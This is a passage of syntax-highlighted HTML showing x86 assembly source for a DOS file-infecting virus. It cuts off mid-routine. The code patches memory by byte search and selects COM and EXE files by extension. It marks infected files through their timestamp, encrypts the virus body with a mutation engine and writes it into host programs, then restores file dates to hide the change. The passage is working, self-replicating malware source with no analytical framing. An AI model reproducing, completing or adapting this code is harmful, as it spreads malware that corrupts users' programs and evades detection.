                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">start_patch1</span><span class="sc4">-</span><span class="sc5">memory_patch</span><span class="sc0">
</span><span class="sc5">next_patch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">; Another patch?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">search_code</span><span class="sc0">             </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_21h</span><span class="sc0">

</span><span class="sc5">memory_patch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; Patch #1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">     </span><span class="sc1">; Bytes to search (1)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc0">                     </span><span class="sc1">; Offset to bytes (2)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Ah</span><span class="sc0">      </span><span class="sc1">; Bytes to search (2)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc0">                     </span><span class="sc1">; Offset to the patch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">end_patch1</span><span class="sc4">-</span><span class="sc5">start_patch1</span><span class="sc0"> </span><span class="sc1">; Patch size</span><span class="sc0">
</span><span class="sc5">start_patch1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                 </span><span class="sc1">; Patch code</span><span class="sc0">
</span><span class="sc5">end_patch1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; Patch #2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; Bytes to search (1)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0">                       </span><span class="sc1">; Offset to bytes 2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc0">        </span><span class="sc1">; Bytes to search (2)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FCh</span><span class="sc0">                    </span><span class="sc1">; Offset to the patch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">end_patch2</span><span class="sc4">-</span><span class="sc5">start_patch2</span><span class="sc0"> </span><span class="sc1">; Patch size</span><span class="sc0">
</span><span class="sc5">start_patch2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">93h</span><span class="sc0">        </span><span class="sc1">; Patch code</span><span class="sc0">
</span><span class="sc5">end_patch2</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
                </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">           </span><span class="sc1">; Search end of path</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">jmp_return_dpl0</span><span class="sc0"> </span><span class="sc1">; Found? No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_extension</span><span class="sc0"> </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">jmp_return_dpl0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return_dpl0</span><span class="sc0">

</span><span class="sc5">check_extension</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Read file extension</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F0Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc12">'OC'</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0F0Fh</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; (*.CO?) COM file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">executable_file</span><span class="sc0">         </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc12">'XE'</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0F0Fh</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; (*.EX?) EXE file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">executable_file</span><span class="sc0">         </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return_dpl0</span><span class="sc0">

</span><span class="sc5">executable_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">l_do_crc</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; Make CRC with filename</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_do_crc</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">          </span><span class="sc1">; Skip filename (CRC) ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_skip_file</span><span class="sc0">    </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return_dpl0</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">no_skip_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Open file I/O</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; BX := handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">initialize_random_seed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Get file date &amp; time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">filedate</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Save</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">filetime</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">          </span><span class="sc1">; Already infected?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">filetime</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">  </span><span class="sc1">; Mark infection</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">filetime</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">BUFFER_SIZE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Read</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">BUFFER_SIZE</span><span class="sc0">  </span><span class="sc1">; Too small?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_end_file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">filesize_l</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; Save original file size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">filesize_h</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F000h</span><span class="sc0">       </span><span class="sc1">; Too big?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">signature</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">; EXE file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_exe</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">host_type</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; It's a COM file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setup_engine</span><span class="sc0">    </span><span class="sc1">; Encrypt virus code</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Write original code (end of file)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_start_file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">BUFFER_SIZE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Write encrypted virus code</span><span class="sc0">
</span><span class="sc5">restore_fdate</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">filetime</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filedate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Restore file date and time</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Close file</span><span class="sc0">
</span><span class="sc5">return_dpl0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Re-enter virus int 21h to kill this</span><span class="sc0">
                                        </span><span class="sc1">;  copy done for replication</span><span class="sc0">

</span><span class="sc5">infect_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">pages</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">      </span><span class="sc1">; Too small?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">        </span><span class="sc1">; (TASM 2.5 FIX. UNNECESSARY IN 4.0)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">max_mem</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">; cmp ds:max_mem,0FFFFh</span><span class="sc0">
                                        </span><span class="sc1">; Needs memory? TSR or exec files?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">host_type</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; It's an EXE file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">relo_items</span><span class="sc0"> </span><span class="sc1">; Numbers of relocation items</span><span class="sc0">
                                        </span><span class="sc1">; Set it to 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_items</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">         </span><span class="sc1">; Too much items?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ofs_reloc</span><span class="sc0"> </span><span class="sc1">; Offset of 1st reloc. item</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ofs_relocitems</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">filesize_l</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">header_size</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; Calculate header size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Total size - header size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">       </span><span class="sc1">; Loadable module too small?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">val_ip</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">file_exeIP</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; Save Exe IP</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; Save Exe CS</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">val_ip</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Set to 0</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Set to 0(vir code starts after header)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_start_file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Save modified header</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">header_size</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Calculate size header</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Lseek after header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">BUFFER_SIZE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Read original code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setup_engine</span><span class="sc0">    </span><span class="sc1">; Encrypt virus code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Lseek after header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">BUFFER_SIZE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Save encrypted virus code after header</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_end_file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Save original code (end of file)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_fdate</span><span class="sc0">

</span><span class="sc5">go_start_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Lseek start</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">go_end_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">         </span><span class="sc1">; Lseek end</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">int_21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">             </span><span class="sc1">; call far int 21h</span><span class="sc0">
</span><span class="sc5">ofs_i21</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
